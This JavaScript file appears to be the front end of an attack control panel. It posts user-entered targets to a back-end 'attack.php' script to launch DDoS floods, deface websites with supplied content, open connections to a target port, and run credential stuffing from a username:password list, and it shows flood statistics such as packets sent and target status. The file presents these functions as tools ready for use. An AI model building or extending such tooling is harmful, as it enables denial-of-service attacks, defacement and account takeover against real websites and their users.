function showTab(tabId) {
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(tab => {
        tab.style.display = 'none';
    });
    document.getElementById(tabId).style.display = 'block';
}

function startDDoS() {
    const target = document.getElementById('ddos-target').value;
    if (!target) {
        alert('Please enter a target URL or .onion address.');
        return;
    }

    fetch('main/attack.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `target=${encodeURIComponent(target)}&attackType=ddos`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            updateStatistics(data);
        } else {
            alert('DDoS attack failed: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while initiating the DDoS attack.');
    });
}

function startDefacement() {
    const target = document.getElementById('defacement-target').value;
    const content = document.getElementById('defacement-content').value;
    if (!target || !content) {
        alert('Please enter a target URL and defacement content.');
        return;
    }

    fetch('main/attack.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `target=${encodeURIComponent(target)}&attackType=defacement&content=${encodeURIComponent(content)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Defacement successful!');
        } else {
            alert('Defacement failed: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while initiating the defacement.');
    });
}

function establishConnection() {
    const target = document.getElementById('connection-target').value;
    const port = document.getElementById('connection-port').value;
    if (!target || !port) {
        alert('Please enter a target IP/URL and port.');
        return;
    }

    fetch('main/attack.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `target=${encodeURIComponent(target)}&attackType=connection&port=${encodeURIComponent(port)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Connection established!');
        } else {
            alert('Connection failed: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while establishing the connection.');
    });
}

function startCredentialStuffing() {
    const target = document.getElementById('credential-target').value;
    const credentials = document.getElementById('credential-list').value;
    if (!target || !credentials) {
        alert('Please enter a target URL and a username:password list.');
        return;
    }

    fetch('main/attack.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `target=${encodeURIComponent(target)}&attackType=credentialStuffing&credentials=${encodeURIComponent(credentials)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            alert('Credential stuffing started!');
        } else {
            alert('Credential stuffing failed: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while initiating credential stuffing.');
    });
}

function updateStatistics(data) {
    document.getElementById('mbps').innerText = data.mbps || 'N/A';
    document.getElementById('packets-sent').innerText = data.packetsSent || 'N/A';
    document.getElementById('target-status').innerText = data.targetStatus || 'N/A';
    document.getElementById('time-elapsed').innerText = data.timeElapsed || 'N/A';
}